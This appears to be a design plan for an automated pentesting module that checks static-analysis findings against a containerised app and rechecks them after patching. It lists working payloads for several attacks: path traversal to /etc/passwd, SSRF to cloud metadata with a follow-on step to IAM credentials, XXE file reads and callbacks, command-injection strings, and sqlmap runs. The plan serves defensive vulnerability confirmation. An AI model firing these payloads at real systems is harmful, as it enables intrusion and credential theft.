# Phase 2c — ExploitEngine Implementation Plan

## Status: PLANNED (not yet implemented)

---

## Goal

An agentic pentester that takes the SurfaceDiscovery output + ScanFindings and confirms
whether each SAST finding is genuinely exploitable via HTTP. Produces ProbeResult records
that prove (or disprove) exploitability with concrete HTTP request/response evidence.

---

## New Files

| File | Purpose |
|---|---|
| `asel/exploit.py` | ExploitEngine class + probe primitives |
| `tests/test_exploit.py` | Unit tests (all network I/O mocked) |

## Model Changes (`asel/models.py`)

Add `ProbeResult` and `ProbeStatus` to models, plus a `probe_results` field on `RunState`.

```python
class ProbeStatus(str, Enum):
    EXPLOITABLE = "exploitable"
    NOT_EXPLOITABLE = "not_exploitable"
    INCONCLUSIVE = "inconclusive"
    SKIPPED = "skipped"        # no matching endpoint, tool missing, etc.

class ProbeResult(BaseModel):
    finding_id: str            # links to ScanFinding.id
    endpoint: HttpEndpoint     # what was probed
    probe_type: str            # "sqli" | "ssrf" | "path_traversal" | "xxe" | "cmdi"
    request: dict              # {"method": .., "url": .., "headers": .., "body": ..}
    response_code: int = 0
    response_snippet: str = "" # first 500 chars of response body
    status: ProbeStatus = ProbeStatus.INCONCLUSIVE
    evidence: str = ""         # what in the response proves exploitability
    chain: list[str] = []      # subsequent steps taken after initial confirmation
    fidelity: str = "high"     # "high" | "medium" | "low"
    fidelity_notes: str = ""   # what was stubbed that might affect this result

# RunState gains:
probe_results: list[ProbeResult] = []
```

---

## ExploitEngine API

```python
class ExploitEngine:
    def __init__(
        self,
        base_url: str,              # e.g. "http://localhost:8765"
        repo_path: Path,
        runtime_result: RuntimeResult,
    ): ...

    def probe(
        self,
        surface: SurfaceDiscoveryResult,
        findings: list[ScanFinding],
    ) -> list[ProbeResult]:
        """
        Main entry point. Called once after initial scan.
        Links findings to endpoints, dispatches probes, returns results.
        """

    def confirm(
        self,
        probe_results: list[ProbeResult],
        findings: list[ScanFinding],
    ) -> list[ProbeResult]:
        """
        Post-patch confirmation. Re-runs probes for findings that were
        exploitable. Returns updated ProbeResults with confirmed_fixed field.
        """
```

---

## Route → Finding Linkage

**Algorithm** (deterministic, no LLM):

```
For each ScanFinding f:
  1. Find endpoints where endpoint.source_file ends with f.file_path
     (handles full path vs. relative path mismatches)
  2. Among those, score by line proximity:
       score = 1 / (1 + abs(endpoint.source_line - f.line_number))
     Pick highest score. Accept if within ±30 lines.
  3. If no source_file match, fall back: match by handler_class simple name
     vs. the filename stem (e.g. "UserController.java" → "UserController")
  4. If still no match: probe_type = SKIPPED, evidence = "no matching endpoint"
```

Multiple findings may map to the same endpoint — probe them all.

---

## Probe Type Dispatch

```
finding.rule_id or finding.title → probe_type

rule_id contains "sql" or "injection"          → sqli
rule_id contains "path" or "traversal"         → path_traversal
rule_id contains "ssrf" or "request-forgery"   → ssrf
rule_id contains "xxe" or "xml"                → xxe
rule_id contains "command" or "exec" or "rce"  → cmdi
(fallback)                                     → SKIPPED
```

---

## Probe Implementations

### 1. Path Traversal

**Payloads** (tried in order, stop at first success):
```
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2F..%2F..%2Fetc%2Fpasswd
```

**Injection points**: any path parameter (`location == "path"`) or query parameter
named `file`, `path`, `name`, `resource`, `doc`, `page`, `template`.

**Confirmation signal**: response body contains `root:` (passwd file content).

**Fidelity risk**: none — filesystem is real inside the container.

---

### 2. SSRF

**Setup**: spin up a `CallbackListener` — a small `http.server` thread on a free host port,
reachable from inside the app container (host networking).

**Payloads**:
```
http://<host-ip>:<callback-port>/ssrf-probe
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/
```

**Injection points**: any query/body parameter named `url`, `uri`, `target`, `redirect`,
`callback`, `webhook`, `endpoint`, `host`, `src`, `href`, `link`.

**Confirmation signal**: callback server receives a GET request within 5s timeout.

**Chaining** (if AWS metadata responds):
- Probe `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Record role name in chain
- Add to `chain: list[str]`

**Fidelity risk**: none.

---

### 3. XXE

**Payload template**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Also try**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<callback-host>:<port>/xxe">]>
<root>&xxe;</root>
```

**Injection points**: POST/PUT endpoints that `consumes: ["application/xml", "text/xml"]`,
or any endpoint with a `body` parameter.

**Confirmation signal**: `root:` in response body, or callback received.

**Fidelity risk**: none.

---

### 4. Command Injection

**Payloads** (tried in order):
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; whoami
| whoami
```

**Injection points**: any query/path/body parameter. Also look for parameter names
that suggest OS interaction: `cmd`, `command`, `exec`, `run`, `query`, `search`, `name`.

**Confirmation signal**:
- Time-based: response latency > 4.5s for `sleep 5` payloads
- Output-based: response body contains `root` or a unix username pattern

**Fidelity risk**: none — shell is real inside the container.

---

### 5. SQLi (via sqlmap)

**Implementation**:
```python
def _probe_sqli(self, endpoint, finding) -> ProbeResult:
    if not shutil.which("sqlmap"):
        return ProbeResult(..., status=ProbeStatus.SKIPPED,
                          evidence="sqlmap not found on PATH")
    # Build target URL with parameter markers
    # Run: sqlmap -u <url> -p <param> --batch --level=1 --risk=1
    #      --timeout=30 --output-dir=<tmpdir>
    # Parse output for "is vulnerable"
```

**Injection points**: same as command injection — all parameters.

**Fidelity risk**: H2 may behave differently from prod DB — annotate in fidelity_notes
if `"h2_override" in runtime_result.stubs_applied`.

**Note**: sqlmap is optional. If not on PATH, ProbeStatus.SKIPPED with a clear message.

---

## Callback Listener

```python
class CallbackListener:
    """
    Tiny HTTP server that listens for inbound connections (SSRF/XXE confirmation).
    Runs in a background thread. Reused across all probes in a single engine run.
    """
    def __init__(self): ...
    def start(self) -> str:
        """Return http://<host-ip>:<port> reachable from inside Docker containers."""
    def wait_for_hit(self, timeout: float = 5.0) -> bool:
        """Block until a request arrives or timeout expires."""
    def stop(self): ...
```

**Host IP detection**: use `socket.gethostbyname(socket.gethostname())` — Docker containers
on bridge network can reach this. Fallback: `host.docker.internal` (Mac/Windows).

**Lifecycle**: start once in `probe()`, stop in a finally block. Reused across SSRF + XXE probes.

---

## Fidelity Logic

Fidelity is derived from `RuntimeResult`:

| Condition | Fidelity | Note |
|---|---|---|
| `stubs_applied == []` | `"high"` | Clean startup, no overrides |
| `"security_disabled" in stubs_applied` | `"medium"` | Auth bypassed — endpoints accessible that wouldn't be in prod |
| `"h2_override" in stubs_applied` | `"medium"` (sqli: `"low"`) | DB substituted; SQLi results less reliable |
| Dep containers provisioned | `"high"` | Real DBs provisioned |

---

## Pipeline Integration (`asel/pipeline.py`)

```
# After SurfaceDiscovery, before initial scan:

if (runtime_result.status == STARTED and
        surface.discovery_source != "none" and
        findings_with_matching_endpoints):

    _step("ExploitEngine: probing...")
    exploit_engine = ExploitEngine(runtime_result.base_url, repo_path, runtime_result)
    probe_results = exploit_engine.probe(surface, findings)
    state.probe_results = probe_results
    self._save(state, run_dir)
    _step(f"Probing complete: {exploitable}/{total} confirmed exploitable")
```

```
# After remediation loop, before final test:

if state.probe_results:
    _step("ExploitEngine: confirming patches...")
    confirmed = exploit_engine.confirm(state.probe_results, state.findings)
    state.probe_results = confirmed
    self._save(state, run_dir)
```

**Skips**: if no surface, or runtime not started, skip entirely (log a dim message).

---

## Open Questions (to resolve before implementing)

1. **Agentic or deterministic?**
   The design doc says "agentic pentester" with tool calls. But building it as a
   deterministic dispatcher (no LLM, just structured payloads) is simpler, testable,
   and faster. Recommendation: **deterministic first** — LLM reasoning layer can be
   added on top later if needed.

2. **Chaining depth**
   The design shows SSRF → metadata → credential theft chains.
   Recommendation: implement depth-1 chaining only in 2c (try the next step if initial
   probe confirms). Full chains in 2d.

3. **sqlmap: inside container or host?**
   Running sqlmap on the host targeting `localhost:<host-port>` is simplest.
   Recommend: host-side, optional, skipped if not on PATH.

4. **confirm() granularity**
   Run confirm() once at the end (after all remediations) or after each
   remediation iteration? Design shows once at end — simpler, fewer HTTP calls.

5. **Parameter fuzzing scope**
   Only inject into parameters that exist on the endpoint (from SurfaceDiscovery),
   or also try query string fuzzing on any parameter name?
   Recommendation: restrict to discovered parameters + a small set of heuristic names.

---

## Testing Strategy

All Docker/HTTP calls mocked. Test:

- Linkage algorithm: endpoints matched, scored, skipped correctly
- Each probe type: correct payload sent, correct confirmation logic
- Fidelity assignment: based on stubs_applied values
- CallbackListener: receives a request, wait_for_hit returns True
- sqlmap: skipped gracefully when not on PATH
- probe() / confirm() end-to-end with mock httpx responses

---

## Dependencies

No new Python packages needed:
- `httpx` — already used in runtime.py and surface.py
- `subprocess` — already used in pipeline.py (for sqlmap)
- `http.server` / `threading` — stdlib (for CallbackListener)
- `shutil.which` — stdlib (for sqlmap/nuclei detection)
